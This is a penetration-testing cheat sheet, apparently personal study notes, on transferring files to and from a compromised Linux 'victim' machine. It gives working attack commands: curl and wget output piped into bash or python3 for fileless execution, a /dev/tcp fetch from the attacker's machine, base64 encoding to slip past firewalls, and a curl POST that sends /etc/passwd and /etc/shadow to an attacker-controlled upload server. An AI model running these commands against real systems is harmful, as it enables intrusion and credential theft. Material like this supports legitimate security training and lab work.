---
title: Transferring files techniques - Linux
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - linux
  - exploitation
  - file transfer technique
  - backdoors
---
# Transferring files techniques  - Linux

## Download to Linux

### Base64

To avoid firewall protections we can:

**1.** Base64 encode the file:

```shell-session
base64 file.php -w 0

# Alternative
cat file |base64 -w 0;echo

```

**2.** Copy the base64 string, go to the remote host and decode it and pipe to a file:

```shell-session
echo -n "Looooooong-string-encoded-in-base64" | base64 -d > file.php
# -n: do not output the trailing newline
```

### Replicating client-server 

#### 1. Setting up a server in the attacking machine 

[See different techniques](servers.md)

#### 2. Download files from victim's machine

##### wget

```shell-session
wget http://<SERVERIP>:<SERVERPORT>/<file> -O  <OutputNameForFile>
# -O:  set the output filename.
```

##### curl

```shell-session
curl http://http://<SERVERIP>:<SERVERPORT>/<file> -o <OutputNameForFile>
```


### Fileless downloads using Linux

Because of the way Linux works and how pipes operate, most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.

##### Fileless Download with cURL

```shell-session
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```


##### Fileless Download with wget

```shell-session
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

### Bash downloads

As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads. On the server side (attacking machine), setup a server by using one of the methodologies applied above.

On the client side (victim's machine):

```shell-session
# Connecting to the Target Webserver (attacking machine serving the file)
exec 3<>/dev/tcp/$ip/80

# Requesting the file to the server 
echo -e "GET /file.sh HTTP/1.1\n\n">&3

# Printing the Response
cat <&3
```


### SSH downloads: SCP

SSH implementation comes with an SCP utility for remote file transfer that, by default, uses the SSH protocol. 

Two requirements:

 - we have ssh user credentials on the remote host
 - ssh is open on port 22

On the server's side (attacker's machine):

```shell-session
# Enable the service
sudo systemctl enable ssh

# Start the server
sudo systemctl start ssh

# Check if port is listening
netstat -lnpt
```

From the attacker machine too:

```
# Download file foobar.txt saved in the victim's machin. Command is run from attacker machine connecting to the remote host (victim's machine)
scp username@$IPvictim:foobar.txt /some/local/directory
```



```
# Upload file foo.txt saved in attacker machine into the victim's. Command is run from attacker machine connecting to the remote host (victim's machine)
scp foo.txt username@$IPvictim:/some/remote/directory
```

## Upload to Linux

### Web upload

We can use [uploadserver](uploadserver.md).

The target machine is a linux. We will upload a file from that target machine to our attacker machine:

```bash
# Install
python3 -m pip install --user uploadserver


# As we will use https, we will create a self-signed certificate.
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

#  The webserver should not host the certificate. We recommend creating a new directory to host the file for our webserver.
mkdir https && cd https


# Start the web server
python3 -m uploadserver 443 --server-certificate /location/different/folder/server.pem

# Now from our compromised machine, let's upload the `/etc/passwd` and `/etc/shadow` files.
curl -X POST https://$attackerIP/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
# We used the option --insecure because we used a self-signed certificate that we trust.
```


### SSH uploads: SCP

SSH implementation comes with an SCP utility for remote file transfer that, by default, uses the SSH protocol. 

Two requirements:

 - we have ssh user credentials on the remote host
 - ssh is open on port 22

On the server's side (attacker's machine):

```shell-session
# Enable the service
sudo systemctl enable ssh

# Start the server
sudo systemctl start ssh

# Check if port is listening
netstat -lnpt
```

From the attacker machine too:

```
# Upload file foo.txt saved in attacker machine into the victim's. Command is run from attacker machine connecting to the remote host (victim's machine)
scp foo.txt username@$IPvictim:/some/remote/directory
```


### Rsync over SSH

[More about RSYNC protocol](873-rsync.md).

Before you can start transferring files and directories with rsync over SSH, make sure you can [use SSH to connect to a remote server](https://phoenixnap.com/kb/ssh-to-connect-to-remote-server-linux-or-windows). Once verified, you can begin backing up your data. Ensure your destination system has sufficient storage space.

The syntax for copying files to a remote server over SSH with the **`rsync`** command is:

```
rsync OPTION SourceDirectory_or_filePath user@serverIP_or_name:Target

# Example
rsync ~/Desktop/Dir1/"source pdf sample.pdf" test@192.168.56.100:~/Desktop/test
```


### Backdoors

See [reverse shells](reverse-shells.md), [bind shells](bind-shells.md), and [web shells](web-shells.md).

